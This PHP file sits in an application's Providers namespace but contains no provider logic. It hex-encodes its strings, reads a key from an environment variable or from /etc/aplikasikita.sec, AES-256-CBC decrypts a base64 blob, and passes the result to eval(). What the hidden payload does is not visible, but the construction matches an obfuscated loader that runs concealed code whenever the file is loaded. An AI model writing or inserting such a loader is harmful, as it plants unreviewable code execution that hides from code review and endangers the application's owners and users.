<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('mCVMW3f/hYCTThYPeBoPcw==');

$c=base64_decode(

'3NOc7atXn9zOpGW93Ir/o0nW3J3lrf6h9Rf4oMdYLL9GmPrdpE2rk2kxjCYxziNdxENEL+WlZGZy' .
'MxEs8iry5yLD0iSdckdo8cBaOufAwK+rJdmE55oIo4IAXsIYABdxU9czJVqwVqOadxe2S4ba4JkY' .
'H4cAF+fVXgrTy/cW86frOQP7xSQ3mxNge/gHvGvGwO0bRIMbAicY4QKELxtI+yZqXoxgz2Cn0eua' .
'RsHySgQWEnTq+pALgXYcS8TZrOW8wkHbAI09hGP1jAEEL8dJTnYyQM5nJ/zc0Ae6x1AaqQQWPKC0' .
'Zpel+Rz7oa2AJqO4FmBTgqUH4XqgNjMsqvz3EKkJRZkZ16isNexLVzn0J6NWBj3Vs7hKtUO1V/20' .
'5m+9+l1XM+f9TniSiGNm9a6W2wwv2Hbo1R+CKEbds1zz2ZMtIIfVBAzggwlnYpRH9j038rm4MKZG' .
'vMFmsIp0GoHCeFPU0OO69Yx0I5X8dpIt0atjCWpw3oF7dVMR2BZSVkUdnL18lj0+PRAl97D9UPO3' .
'+fEAHgfPhcJwuryZFXwue6XtTBDarkLklPbUFvLmxLLZILk9YM9pajJ9608z9IHdH0GF+hvNUf/1' .
'B9iaR6TYKBNYNZXnPXCysFygDnYhqBbC5ncWC6nRo7iK454hLWu+DVDsxtL3oeTFwJY/gaJUe5VL' .
'CR0fhKAFV5UK8YPCzmd2UYpXGd3sqN98fasEZjHfnIJ5KwhbR/dnltMn1BAJsA7WCMbWI0A2xj9F' .
'To/5BNY1lsPya236Mht6dA/kbQSHvnhrzG+sSSH1NyBqUPu49tLItdAPGBl5t0K/WrbCo/vKp3ye' .
'+9nKVtnYmEAQewzGsazFQ5rbdTnpQf2E6/3s1ELroGP6wQkFc69oFvwQNIgf3w/MeKmdYN4Wnnng' .
'kJSw/0O9QHr+P7cr1r4oubieD57L1eHesEfKgKjw/H1VlMlV'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

